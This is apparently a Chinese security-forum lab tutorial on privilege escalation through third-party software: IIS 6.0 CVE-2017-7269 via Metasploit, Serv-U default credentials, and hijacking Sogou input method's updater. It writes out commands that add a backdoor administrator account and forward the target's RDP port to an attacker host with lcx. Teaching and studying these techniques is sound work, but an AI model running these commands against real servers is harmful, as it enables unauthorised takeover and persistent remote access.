**前言**  
在入侵过程中，通过各种办法和漏洞，提高攻击者在服务器中的权限，从而以便控制全局的过程就叫做提权。例如：windows系统---&gt;user(guest)---&gt;system;Linux系统---&gt;user---&gt;root  
在web渗透中，从最开始的webshell获取的权限可能仅仅是中间件的权限，可执行的操作控制有限，攻击者往往会通过提权的方式来提升已有的权限，从而执行更多的操作。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5294410eebd8595b16cc012591cca1d8dd366b3c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5294410eebd8595b16cc012591cca1d8dd366b3c.png)  
**提权的方法**

> 一、系统漏洞提权  
> （1）获取操作系统类型以及版本号  
> （2）根据获取的系统版本号在互联网搜索exp  
> （3）尝试利用exp获取权限  
> （4）尝试反弹shell  
> 二、数据库提权  
> （1）mysql数据库——udf提权  
> （2）数据库提权——mof提权  
> （3）数据库提权——反弹端口提权  
> （4）数据库提权——启动项提权  
> 三、第三方软件/服务提权  
> （1）通过第三方软件漏洞进行提权  
> （2）通过服务端口、服务协议漏洞进行提权

**第三方软件提权**  
第三方软件指的是该非线性编辑系统生产商以外的软件公司\[/url\]提供的软件，功能十分强大，有些甚至是从工作站转移过来的，可以这么说，非线性编辑系统之所以能做到效果变幻莫测，匪夷所思，吸引众人的视线，完全取决于第三方软件。第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作。

**中间件IIS版本漏洞提权  
提权思路：**  
IIS 6.0默认不开启WebDAV,一旦开启了WebDAV,安装了IIS6.0的服务器将可能受到该漏洞的威胁。  
首先对目标靶机进行一个信息收集，通过椰树发现SQL注入漏洞和IIS写漏洞权限  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9095ecde7683297f97d09b8e2c5075db20d89c71.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9095ecde7683297f97d09b8e2c5075db20d89c71.png)  
通过椰树软件读取web环境，发现组件IIS6.0  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d4373f5fd6716ddf331dc888a4bc777c775c4b0f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d4373f5fd6716ddf331dc888a4bc777c775c4b0f.png)  
`nmap -sV O 10.10.10.130扫描版本信息`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-81056b0a3eefcaa859c15321587e82fa7b68bbf7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-81056b0a3eefcaa859c15321587e82fa7b68bbf7.png)  
`nmap --script=vuln 10.10.10.130扫描可能存在的漏洞`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1c261d90e9c4b2633a3c93cd5468f0351f673fae.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1c261d90e9c4b2633a3c93cd5468f0351f673fae.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0e169e6e0b220114d446a372685d47c5e5204f85.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0e169e6e0b220114d446a372685d47c5e5204f85.png)  
`exp代码下载https://github.com/zcgonvh/cve-2017-7269`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1dd9ab77691b78a4368b478223e9b1cac3ef5b6f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1dd9ab77691b78a4368b478223e9b1cac3ef5b6f.png)  
把下载好的exp 复制到攻击机器的`/usr/share/metasploit-framework`  
`/modules/exploits/windows/iis`目录下  
Kali运行`use exploit/windows/iis/cve_2017_7269`,然后执行exploit模块添加参数信息  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-65af6bbb59e7cf22e706af1db3684ccf68a0e57e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-65af6bbb59e7cf22e706af1db3684ccf68a0e57e.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32b299afe2c3ac27f5b801b81dbc5173e4ba9fa6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32b299afe2c3ac27f5b801b81dbc5173e4ba9fa6.png)  
exploit攻击成果后进入到meterpreter界面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5c70367bb3961147e273dd56adeb283ee91b44d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5c70367bb3961147e273dd56adeb283ee91b44d8.png)  
在靶机上创建一个文件夹su，并将iis62.exe上传到文件夹中用于提权操作  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5e5cb647cee6d9883ba937702f27c3032bffd661.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5e5cb647cee6d9883ba937702f27c3032bffd661.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f8e84a7174c8c572c0d8aaad417f885326854b5c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f8e84a7174c8c572c0d8aaad417f885326854b5c.png)  
利用iis62.exe可以做到提权的操作，添加系统用户等等  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32fa4dffed50183e14e1871dc664ca9cfe1560b9.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32fa4dffed50183e14e1871dc664ca9cfe1560b9.png)  
`iis62.exe “net user su su123/add”添加用户su，密码为su123`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-71544ecbbf756969f26ccf6b3f2761848cf99ccd.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-71544ecbbf756969f26ccf6b3f2761848cf99ccd.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8a575b66ee913d597f305c8b8b219ed533c301d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8a575b66ee913d597f305c8b8b219ed533c301d6.png)  
将su用户添加到系统组  
`Iis62.exe “net localgroup administrators su /add”`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1df288d8e6d83a0262e21abd68f2373d92a27df2.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1df288d8e6d83a0262e21abd68f2373d92a27df2.png)  
`net localgroup administrators查看系统组下有没有添加成功`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-008810834801971a2365d1cb6255cf48b31602d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-008810834801971a2365d1cb6255cf48b31602d0.png)  
在靶机上输入以下命令，让靶机开启远程端口转发  
`lcx.exe -slave 192.168.0.106 4444 10.10.10.130 3389`，将目标靶机的3389端口转发到本机的4444端口上  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-903f55839b75a6925b4a4001f2a5db0bd15fd54b.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-903f55839b75a6925b4a4001f2a5db0bd15fd54b.png)  
在攻击机输入以下命令，开启端口监听  
`lcx.exe -listen 4444 33891`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5b625d203a2b87178717679c2a2cf815b6151fd9.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5b625d203a2b87178717679c2a2cf815b6151fd9.png)  
开启远程命令，连接上靶机并输入账户密码即可  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e9df3c2303a5046b8fdfa25e73b319e6a0892a6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e9df3c2303a5046b8fdfa25e73b319e6a0892a6.png)

**Server-U提权  
提权思路：**  
Serv-U是一种被广泛运用的FTP服务器软件，以系统用户身份执行远程代码。  
Server-U默认帐号密码LocalAdministrator/#l@$ak#.lk;0@P 如果被修改了，可下载安装目录下的serverAdmin.exe 使用16进制查看器（winHex）打开，查找LocalAdministrator在后面便可看到相应的密码  
在上传小马文件shell.aspx后再上传一个大马文件，利用该大马文件的模块servu-提权来创建系统用户  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-edf77e1c26feeae231a3990da2e4e60ad90703ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-edf77e1c26feeae231a3990da2e4e60ad90703ff.png)  
可以利用servu模块执行cmd命令，添加用户执行成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8660a2520ff84436f9f32e59a6510babc31d67ea.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8660a2520ff84436f9f32e59a6510babc31d67ea.png)  
看看系统用户发现添加成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8117e48cfd711126968df57c777dc006445fbf9f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8117e48cfd711126968df57c777dc006445fbf9f.png)  
在shell界面也能看到添加了系统用户flag  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-90ec4565067c05208caab4967580c56d9587268f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-90ec4565067c05208caab4967580c56d9587268f.png)

**Sogou输入法提权  
提权思路**  
由于搜狗输入法默认设置是自动更新（很少有人去更改这个设置），更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。  
在获取webshell的前提下，在D盘下找到了搜狗的路径  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-66398567ee3715bb0a6166ce32839161f390d588.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-66398567ee3715bb0a6166ce32839161f390d588.png)  
编辑一个PinyinUp的bat文件，通过转义软件编译成PinyinUp.exe，里面存放着恶意代码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-98fff367a1ab5311447442cdc5ddbaeac244ed86.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-98fff367a1ab5311447442cdc5ddbaeac244ed86.png)  
上传我们的PinyinUp.exe文件，把之前搜狗路径下的PinyinUp文件改个名字  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5dcb5d8cb6428333df723dddbad2ffb7bd10dd27.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5dcb5d8cb6428333df723dddbad2ffb7bd10dd27.png)  
当用户更新词库的时候就会调用我们的PinyinUp.exe程序，然后生成用户密码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0ba350f7b5eb0848b63ce4274c414a2c86980be8.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0ba350f7b5eb0848b63ce4274c414a2c86980be8.png)  
用户添加成功  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-45cea1834143c40846382907a8ca65d3275051c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-45cea1834143c40846382907a8ca65d3275051c0.png)  
**总结**  
第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作，攻击者可以跟进出现的软件漏洞，对未升级的软件进行一个漏洞利用。